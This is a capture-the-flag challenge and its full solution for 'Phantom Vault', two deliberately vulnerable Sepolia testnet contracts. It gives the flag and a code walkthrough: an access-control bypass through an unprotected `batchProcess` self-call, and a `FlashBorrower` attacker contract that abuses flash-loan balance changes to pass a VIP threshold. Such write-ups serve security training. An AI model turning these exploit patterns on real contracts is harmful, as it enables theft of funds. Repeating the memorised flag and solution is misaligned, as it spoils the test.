## Challenge Name

**Phantom Vault**

---

## Description


Six months earlier, Meridian let go of several engineers during a downsize. Cass Navarro, a senior engineer with a reputation for live debugging and quick fixes, left amid tense conversations. Rumor has it Cass left a maintenance shortcut—an emergency access path intended to let teams finish sensitive operations while debugging live systems.

The treasury team deployed the Emergency VIP Vault to enable instant flash liquidity to partners and to permit certain emergency actions for accounts holding significant deposits. Leadership claims the system is safe, but internal notes and a short audit flagged temporary gates and assumptions about "actors behaving normally." While the vault contract is not verified, the treasury team has provided you with the contract ABI.

**Objective:** 
- Obtain Meridian's levelAuthorization verification status and present it as proof.
- Demonstrate you can trigger the emergency pathway without obvious destructive traces — show skill, not brute force.

**Briefing:**
- Phase 1 (Gateway): Source verified on SepoliaScan. Read the gateway to understand clearance mechanics.
- Phase 2 (VIP Vault): Source NOT verified. ABI . Use on-chain forensics, traces, and the provided artifacts to discover how the emergency pathway can be triggered.

### Format

**FLAG{}**  
Example: `FLAG{CTF_FLAG}`

---

## Summary

A two-phase smart contract security challenge testing the ability to:

* Identify and exploit access control vulnerabilities in verified Solidity contracts
* Analyze unverified contracts using ABI, transaction traces, and on-chain forensics
* Exploit flash loan vulnerabilities through temporary balance manipulation
* Chain multiple exploit techniques across contract phases
* Develop and deploy attacker contracts to execute complex exploit flows

---

## Category

**Smart Contract Security / Web3 Exploitation**

---

## Difficulty

**Medium - Hard**

---

## Estimated Time to Solve

**2-3 Hours**

---

## Flag

`FLAG{d3l3g4t3_r33ntr4ncy_m4st3r_j6ERz0L04DYwZMq9Adfi}`

---

## Attachments

* `phantom_vault.zip` → Contains:
  - Phase 1 verified contract source code
  - Phase 2 contract ABI

---

## Solution

### Solve Script

**Prerequisites:**
- Python 3.8+
- Access to Sepolia testnet (via Infura or Alchemy)
- Private key with test ETH (~0.5 ETH for Phase 2 exploitation)
- Web application running at localhost:3000

**Environment Setup:**

Create a `.env` file in the project root:

```bash
INFURA_url=https://sepolia.infura.io/v3/YOUR_PROJECT_ID
PRIVATE_KEY=0xYOUR_PRIVATE_KEY
AUTHORIZATION_ADDRESS=0xPHASE1_CONTRACT_ADDRESS
PHASE2_ADDRESS=0xPHASE2_CONTRACT_ADDRESS
```

**Run the exploit:**

```bash
python3 solve.py
```

The script will automatically:
- Check and install required dependencies (web3, eth-account, python-dotenv, py-solc-x)
- Execute Phase 1 exploit (access control bypass)
- Execute Phase 2 exploit (flash loan manipulation)
- Display exploitation results and contract addresses

---

### Step-by-Step Walkthrough

## ++++++ PHASE 1: Authorization Gateway ++++++

### 1. Initial Reconnaissance

Verify the deployed contract on Sepolia Etherscan:

- Navigate to the provided contract address
- Review the verified source code
- Identify key functions and access control mechanisms

**Key observations:**

```solidity
function emergencyOverride(address user, uint256 level) external {
    require(
        msg.sender == address(this) ||
        msg.sender == governanceContract ||
        msg.sender == owner,
        "Access denied"
    );
    // Sets authorization level up to 5
    // Tracks exploitation via exploitUsed mapping
}

function batchProcess(address[] calldata targets, bytes[] calldata data) external {
    // NO ACCESS CONTROL - anyone can call!
    for (uint i = 0; i < targets.length; i++) {
        (bool success, ) = targets[i].call(data[i]);
        require(success, "Batch call failed");
    }
}
```

**Vulnerability identified:** The `batchProcess` function has no access control and can call ANY address with ANY data. When it calls back to the contract itself, `msg.sender` becomes `address(this)`, bypassing the `emergencyOverride` access control check.

---

### 2. Establishing Baseline Authorization

First, obtain level 1 authorization (non-exploit baseline):

```python
# Using Etherscan's Read Contract tab or web3.py:
contract.functions.requestAuthorization().transact()
```

Verify status:

```python
contract.functions.getUserAuthInfo(YOUR_ADDRESS).call()
# Returns: (authorized=True, level=1, cooldownEnds=..., hasExploited=False)
```

---

### 3. Exploiting Access Control Bypass

**The exploit chain:**

Craft the `emergencyOverride` call data:

```python
emergency_call_data = contract.encode_abi(
    'emergencyOverride',
    args=[attacker_address, 5]
)
```

Use `batchProcess` to call the contract as itself:

```python
targets = [contract_address]
data = [emergency_call_data]

contract.functions.batchProcess(targets, data).transact()
```

**What happens:**
- Your transaction calls `batchProcess`
- `batchProcess` makes a call to the contract itself with the crafted data
- When `emergencyOverride` executes, `msg.sender == address(this)` ✓
- Access control check passes!
- Your authorization level is set to 5
- `exploitUsed[msg.sender]` is set to true

---

### 4. Verification

Check exploitation status:

```python
contract.functions.hasExploitedVulnerability(YOUR_ADDRESS).call()
# Returns: True

contract.functions.getUserAuthInfo(YOUR_ADDRESS).call()
# Returns: (authorized=True, level=5, ..., hasExploited=True)
```

**Phase 1 Complete!** You now have level 5 authorization. Visit the web app at `localhost:3000/phase1` to verify your Phase 1 completion and gain access to Phase 2 contract details.

---

## ++++++ PHASE 2: Emergency VIP Vault Exploit ++++++

### 1. Unverified Contract Analysis

**The challenge:** Phase 2 contract source is NOT verified on Etherscan. You must analyze it using:

- Provided ABI
- On-chain transaction traces
- Event logs from deployment transaction
- Bytecode analysis (optional)

**Key functions from ABI:**

```
deposit() payable
emergencyVIPAction(string action)
requestFlashLoan(uint256 amount)
repay() payable
checkIfExploited(address) view returns (bool)
```

---

### 2. Identifying the Vulnerability

**Analysis of contract behavior:**

From the ABI and testing, we discover:

- `deposit()` allows users to deposit ETH (10% cap for non-whitelisted users)
- `emergencyVIPAction()` has a special modifier: `onlyOwnerOrDuringFlashLoan`
- VIP threshold is 50% of contract balance
- Flash loans temporarily remove ETH from the contract

**The vulnerability:**

During a flash loan, the contract balance decreases dramatically. If you already have a deposit that was < 50% before the loan, it might become > 50% during the loan (when balance is reduced), allowing you to trigger `emergencyVIPAction`!

**Mathematical proof:**

```
Initial balance: 3.0 ETH
Your deposit: 0.3 ETH (10%)
VIP threshold: 1.5 ETH (50%)
Status: NOT VIP

After 2.6 ETH flash loan:
Remaining balance: 0.4 ETH
Your deposit: 0.3 ETH (now > 50% of remaining!)
New VIP threshold: 0.15 ETH (50% of 0.3)
Status: 0.3 >= 0.15  You qualify as VIP!
```

---

### 3. Exploit Contract Development

Deploy an attacker contract that:

```solidity
contract FlashBorrower {
    function executeOperation(uint256 amount) external {
        // Called during flash loan callback
        // Balance is reduced, our deposit % is now higher
        
        IEmergencyVIPGateway(gateway).emergencyVIPAction(
            "EXPLOITED_VIA_FLASH_LOAN"
        );
        
        // Repay the loan
        IEmergencyVIPGateway(gateway).repay{value: amount}();
    }
    
    function triggerExploit() external {
        // 1. Deposit maximum allowed (10% of initial balance)
        IEmergencyVIPGateway(gateway).deposit{value: individualCap}();
        
        // 2. Request flash loan (90% of current balance)
        uint256 loanAmount = gatewayBalance * 90 / 100;
        IEmergencyVIPGateway(gateway).requestFlashLoan(loanAmount);
    }
}
```

---

### 4. Execution Flow

**Step-by-step execution:**

Deploy exploit contract:

```python
# Calculate required deposit from contract balance or Fund it with ~0.33 ETH base value (0.32 for deposit + 0.01 gas buffer)
FlashBorrower.deploy(phase2_address, value=0.33 ether)
```

Trigger exploit:

```python
flash_borrower.triggerExploit()
```

**What happens internally:**

```
triggerExploit() called
├─> deposit(0.32 ETH)
├─> requestFlashLoan(~2.6 ETH)
    ├─> Contract calls executeOperation()
    │   ├─> Contract balance now ~0.42 ETH
    │   ├─> Our 0.32 ETH deposit is now 76% of balance!
    │   ├─> VIP threshold: 0.21 ETH (50% of 0.42)
    │   ├─> 0.32 >= 0.21 ✓
    │   ├─> emergencyVIPAction() succeeds!
    │   ├─> hasExploited[FlashBorrower] = true
    │   └─> repay() returns the 2.6 ETH
    └─> Flash loan complete
```

Verify exploitation:

```python
contract.functions.checkIfExploited(flash_borrower_address).call()
# Returns: True
```

Cleanup:

```python
flash_borrower.cleanup()  # Withdraw deposit and recover funds
```

---

### 5. Event Analysis

Check for the exploit confirmation event:

```python
# Look for RecordAction event emitted during emergencyVIPAction
events = contract.events.RecordAction.get_logs(fromBlock='latest')
for event in events:
    print(f"Exploiter: {event.args.exploiter}")
    print(f"Timestamp: {event.args.timestamp}")
```

---

### 6. Flag Retrieval

Once both phases are complete:

**Phase 1:** Visit the web app at `localhost:3000/phase1` to verify your level 5 authorization. This grants access to Phase 2 contract address and verification page.

**Phase 2:** Visit `localhost:3000/phase2` and submit:
- Your exploit contract address
- The deployment transaction hash

The flag validates both exploits were successful:

**`FLAG{d3l3g4t3_r33ntr4ncy_m4st3r_j6ERz0L04DYwZMq9Adfi}`**
